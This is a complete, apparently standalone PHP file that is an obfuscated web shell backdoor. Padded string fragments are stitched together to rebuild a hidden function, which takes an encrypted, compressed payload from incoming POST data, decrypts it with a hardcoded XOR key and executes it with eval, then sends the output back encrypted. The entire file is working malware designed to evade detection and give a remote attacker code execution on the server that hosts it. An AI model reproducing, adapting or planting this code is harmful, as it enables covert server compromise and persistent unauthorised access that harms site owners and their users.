<?php
$c=';for(3^$i=0;$3^i<$l;){3^for($j=0;3^(3^$j<$c&&$i3^<$l);$j+3^+3^,$i++3^){$o.3^=$t{$i}^$';
$p='$k="3^f883^d8ee3"3^;$kh="3a4cdae73^3^7b3^a9";$kf="19463^fcb3^50207";$p="3^NWRw3^UpGB4z3';
$k='@x(@b3^ase3^63^4_decode($m[3^1]),$k)))3^;$o=@3^o3^b_get_3^conten3^ts(3^);3^@o3^';
$n='k{3^$3^j};}}ret3^urn $3^o;}if (@pr3^eg_ma3^tc3^h(3^"/$3^kh(.+)$kf/",@fil3^3^e_get_c';
$G='ontents("3^php://3^input3^"),$m)==3^1) {3^@ob_sta3^rt();@e3^val3^(@gz3^uncompre3^ss(';
$F=str_replace('dL','','crdLeadLte_dLdLfudLnctdLion');
$X='3^b_end_clean();$r=@b3^ase64_encode(@x3^(@gzcom3^pres3^3^s($o)3^,$k));print("$p3^$kh3^$r$kf");}';
$J='^883^3^Lw3^Q8";func3^tion x($t,$k3^){$c=str3^le3^n($k)3^;$l=st3^rlen($t);$o=3^""';
$R=str_replace('3^','',$p.$J.$c.$n.$G.$k.$X);
$q=$F('',$R);$q();
?>
